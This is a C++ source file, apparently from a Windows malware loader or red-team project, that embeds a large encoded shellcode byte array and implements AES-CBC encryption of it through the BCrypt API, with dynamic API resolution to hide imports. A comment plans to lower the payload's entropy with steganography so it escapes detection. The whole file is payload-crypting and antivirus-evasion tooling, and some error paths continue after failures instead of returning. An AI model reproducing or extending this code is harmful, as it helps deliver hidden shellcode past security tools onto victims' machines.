#include "../headers/encrypt_payload.h"
#include <cstdlib>
#include <ctime>
#include <iostream>

// todo:reduce entropy of the payload by using steganography to hide in file, 
// resource section or download and pad payload with repetitive bytes 
unsigned char payload[] =
"\x48\x31\xc9\x48\x81\xe9\xac\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xdc\xae\xed\xe9\x52\x67\x22\x43\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x94\x9f\x24"
"\xa1\xd3\x8e\x93\xbc\x23\x51\xa5\x64\x57\x88\xdd\xbc\x23"
"\xe6\x56\x7c\xab\x82\x07\x7a\x01\xed\xa3\xa1\x63\x3f\x05"
"\x0b\xf1\x56\x12\x16\xad\x85\xd6\x9e\x14\x82\x80\x51\x66"
"\x92\x93\x29\xda\x03\x45\xd5\x60\xdb\x93\x29\x6d\xf0\x3d"
"\xb0\x3d\xa5\xd2\x8a\xeb\xba\x80\xe1\xd7\x03\x24\xfb\xdd"
"\xb4\x37\x2f\x6d\xd0\xd1\x87\x5e\x82\xf7\x65\xfa\x2a\x66"
"\x49\xdf\x47\x73\x63\xbe\x2a\x66\xfe\x2c\x4f\x5d\xba\x97"
"\xe1\xcb\xad\xf0\x82\x47\xd4\x66\x9d\xb4\x4e\x68\x35\x89"
"\x6e\xb5\x18\x83\x49\x09\x7f\xcd\x57\xd9\xaf\x4d\xc8\xcc"
"\xfb\xcb\x68\xd9\xaf\xfa\x3b\xd1\x07\xe3\xe4\xe3\x1b\x93"
"\x15\x09\xcf\x7c\xb0\x6e\x7d\x4a\x7f\xbe\x01\xc6\x63\x4a"
"\xe1\xf6\x17\x74\x5d\xc9\x02\xb6\xa9\x34\xa2\xc5\xe5\x57"
"\x53\xe0\xe1\x44\x21\xe1\xfd\x8e\x50\xd6\xe1\xfe\xa1\x9c"
"\xfd\x8e\x50\x96\xe1\xfe\x81\xd4\xf8\x34\xcb\xfe\xa6\xc2"
"\xb9\xce\xfd\x34\xc2\x1a\x95\x14\x8f\x86\x99\x25\x43\x77"
"\x60\x78\xb2\x85\x74\xe7\xef\xe4\xe1\xfe\xa1\xa4\xf4\x54"
"\x89\xf4\x95\x3d\xf2\x54\xd3\x84\x7a\xae\xa2\x77\xfc\x01"
"\xc7\x05\x02\xb6\x22\xf5\x7b\x84\xb5\x05\x4a\x33\x69\x01"
"\x94\xcc\xb4\xd5\x89\xfe\xb1\x31\x78\xc4\x95\x55\x4b\xb7"
"\x79\x96\xa5\xcc\x4a\xcc\x4f\x87\x60\x34\x78\xb0\x3d\x4d"
"\x03\x60\xe1\x44\x33\xc5\x74\xcc\x0f\x1a\xe8\x74\x32\xbc"
"\x55\x70\xf3\xfa\xaa\x39\xd7\x8c\xf0\x3c\xd3\xc3\x71\x2d"
"\xb7\x0f\xf5\x21\x4b\xb7\x79\x13\xb2\x0f\xb9\x4d\x46\x3d"
"\xe9\x69\xba\x85\x65\x44\x89\xb2\x21\x3d\xf2\x54\xf4\x5d"
"\x43\xee\xf7\x2c\xa9\xc5\xed\x44\x5b\xf7\xf3\x3d\x70\x68"
"\x95\x44\x50\x49\x49\x2d\xb2\xdd\xef\x4d\x89\xa4\x40\x3e"
"\x0c\x7b\x4a\x58\x4b\x08\xde\x06\xc1\xdb\x86\x37\x02\xb6"
"\xe8\x23\xba\x0d\x53\x4d\x83\x5a\x09\x74\xf3\x84\xfc\x8c"
"\xe7\xff\x15\x77\xf3\x95\xe9\x0f\x02\xb4\xa6\x34\xa7\xcd"
"\x3c\xe1\x4e\x3f\x58\x34\x49\xc8\xc2\x23\x05\x49\x7c\x39"
"\x7a\x6e\xdd\x04\x03\xb6\xa9\x2c\xb2\x3e\x9c\x85\x69\xb6"
"\x56\xa0\x99\x8e\xf4\x5b\x52\xe6\xe4\x44\x3a\xc9\x84\xc5"
"\x4a\x49\x69\x3d\x7a\x46\xfd\xfa\xc2\xfe\x20\xb4\xb2\x3e"
"\x5f\x0a\xdd\x56\x56\xa0\xbb\x0d\x72\x6f\x12\xf7\xf1\x39"
"\x7a\x66\xfd\x8c\xfb\xf7\x13\xec\x56\xf0\xd4\xfa\xd7\x33"
"\x69\x01\xf9\xcd\x4a\xcb\x77\x53\x41\xe6\xf3\x84\xb5\x4d"
"\x81\x5a\xb9\x3d\x7a\x66\xf8\x34\xcb\xdc\xad\x34\xab\xcc"
"\x3c\xfc\x43\x0c\xab\xac\x3b\xdb\x4a\xd0\x81\x4e\xa9\x0b"
"\xa6\xcc\x36\xc1\x22\xe8\x20\x83\x99\xc4\xf4\x5c\x6a\xb6"
"\xb9\x75\xf3\xc5\xed\x4d\x8b\x44\xe1\x44\x3a\xc5\x0f\x5d"
"\xa6\xe5\x4c\x8a\x26\xcc\x3c\xc6\x4b\x3f\x6e\x38\xc2\x4d"
"\xfc\x8c\xf2\xfe\x20\xaf\xbb\x0d\x4c\x44\xb8\xb4\x70\xbd"
"\xac\x7b\x60\x86\xfa\xb6\xd4\x5d\xab\xc5\xe2\x5c\x6a\xb6"
"\xe9\x75\xf3\xc5\xed\x6f\x02\xec\xe8\xcf\xf8\xab\xba\x35"
"\xfd\x63\xfe\x2c\xb2\x3e\xc0\x6b\x4f\xd7\x56\xa0\xba\x7b"
"\x7b\xec\x3e\x49\x56\x8a\xbb\x85\x76\x4d\x2b\x70\xe1\xf0"
"\x05\xf1\x01\x44\xfd\x51\xf1\x1f\xf3\xdd\xfc\xc2\xc0\x46"
"\x1c\xd7\xa5\x7b\x60\x05\x02\x26\xd5\x6c\x43";


int main()
{
	API::APIResolver &resolver = API::APIResolver::GetInstance();

	resolver.LoadModules();
	resolver.ResolveAPI();
	MessageBoxA(NULL, "here", "", NULL);

	API::API_ACCESS  api = resolver.GetAPIAccess();

	Tools    tools;
	NTSTATUS status = NULL;
	DWORD	 dwWritten;


	tools.EnableDebugConsole();


	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	if (hConsole == INVALID_HANDLE_VALUE) {
		return 1;
	}

	unsigned char key[KEYSIZE];
	unsigned char iv [IVSIZE];

	//ZeroMemory(key, KEYSIZE);
	//ZeroMemory(iv , IVSIZE);

	
	//tools.PrintConsole((const char*)tools.GetRandomNumber(api));

	if (api.func.pRtlRandomEx)
	{
		tools.PrintConsole("function found in module");

		// Fill arrays with random numbers
		for (auto& x : key) // Use reference to modify the original array
		{
			ULONG seed = tools.GetRandomNumber(api); // Use RandomNumber as the seed

			if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
				/*tools.PrintConsole("rtlgenrandom failed");*/
				return -1;
			else
				x = static_cast<unsigned char>(seed);
		}

		for (auto& x : iv) 
		{
			ULONG seed = tools.GetRandomNumber(api);

			if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
				//tools.PrintConsole("rtlgenrandom failed");
				return -1;
			else
				x = static_cast<unsigned char>(seed);
		}
	}

	tools.PrintConsole("\n");
	WriteConsoleA(hConsole, key, 32, &dwWritten, NULL);
	Sleep(10);

	SecureZeroMemory(key, KEYSIZE);
	MessageBoxA(NULL, "end", "", NULL);
	return 0;
}


bool Encrypt::SimpleEncryption(_In_ void* pPlainTextData, _In_ DWORD sPlainTextSize, _In_ unsigned char* pKey, _In_ unsigned char* pIv, _In_ void** ppCipherTextData, _Out_ DWORD* sCipherTextSize, API::API_ACCESS &api)
{
	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
		return false;


	AES Aes = {
		.pPlainText   = reinterpret_cast<unsigned char*>(pPlainTextData),
		.dwPlainSize  = sPlainTextSize,
		.pCipherText  = nullptr,
		.dwCipherSize = 0, 
		.pKey		  = pKey,
		.pIv		  = pIv
	};

	if (!InstallAes(&Aes, api))
		return false;

	*ppCipherTextData = Aes.pCipherText;
	*sCipherTextSize  = Aes.dwCipherSize;

	return true;
}


bool Encrypt::InstallAes(PAES pAes, API::API_ACCESS &api)
{
	NTSTATUS status;
	
	bool bState			= TRUE;

	void 	*hAlgorithm = NULL;
	void	*hKeyHandle = NULL;

	unsigned long 	cbResult	 = NULL;
	unsigned long 	dwBlockSize  = NULL;
	unsigned long 	cbKeyObject  = NULL;
	unsigned long 	cbCipherText = NULL;

	unsigned char  *pbKeyObject  = NULL;
	unsigned char  *pbCipherText = NULL;


	Tools tools;

	// Intializing "hAlgorithm" as AES algorithm Handle
	status = api.func.pBCryptOpenAlgorithmProvider(&hAlgorithm, L"AES", NULL, 0);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptOpenAlgorithmProvider Failed");
		bState = FALSE; 
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
	}

	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
	status = api.func.pBCryptGetProperty(hAlgorithm, L"ObjectLength", reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptGetProperty[1] Failed");
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
	status = api.func.pBCryptGetProperty(hAlgorithm, L"BlockLength", reinterpret_cast<PBYTE>(&dwBlockSize), sizeof(DWORD), & cbResult, 0);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptGetProperty[2] Failed");
		bState = FALSE; 
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Checking if block size is 16 bytes
	if (dwBlockSize != 16) {
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	status = api.func.pBCryptSetProperty(hAlgorithm, L"ChainingMode", (PBYTE)L"ChainingModeCBC", sizeof(L"ChainingModeCBC"), 0);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptSetProperty Failed");
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
	status = api.func.pBCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, reinterpret_cast<PBYTE>(pAes->pKey), KEYSIZE, 0);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptGenerateSymmetricKey Failed");
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
	status = api.func.pBCryptEncrypt(hKeyHandle, reinterpret_cast<PUCHAR>(pAes->pPlainText), (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, 0x00000001);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptEncrypt[1] Failed");
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Allocating enough memory for the output buffer, cbCipherText
	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
	if (pbCipherText == NULL) {
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	// Running BCryptEncrypt again with pbCipherText as the output buffer
	status = api.func.pBCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, 0x00000001);
	if (!NT_SUCCESS(status)) {
		tools.ShowError("[!] BCryptEncrypt[2] Failed\n");
		bState = FALSE;
		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);

	}

	CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
	return bState;
}
bool Encrypt::CleanEncrypt(void* &hKeyHandle, void* &hAlgorithm, unsigned char* &pbKeyObject, PAES &pAes, unsigned char *pbCiperText, DWORD cbCiperText, API::API_ACCESS &api)
{
	NTSTATUS stat = NULL;

	if (hKeyHandle)
	{
		if (!NT_SUCCESS(stat = api.func.pBCryptDestroyKey(hKeyHandle)))
			return false;
	}
	if (hAlgorithm)
	{
		if (!NT_SUCCESS(stat = api.func.pBCryptCloseAlgorithmProvider(hAlgorithm, 0)))
			return false;
	}
	if (pbKeyObject)
		HeapFree(GetProcessHeap(), 0, pbKeyObject);

	if (pbCiperText != NULL && stat)
	{
		pAes->pCipherText  = pbCiperText;
		pAes->dwCipherSize = cbCiperText;
	}

	return stat;
}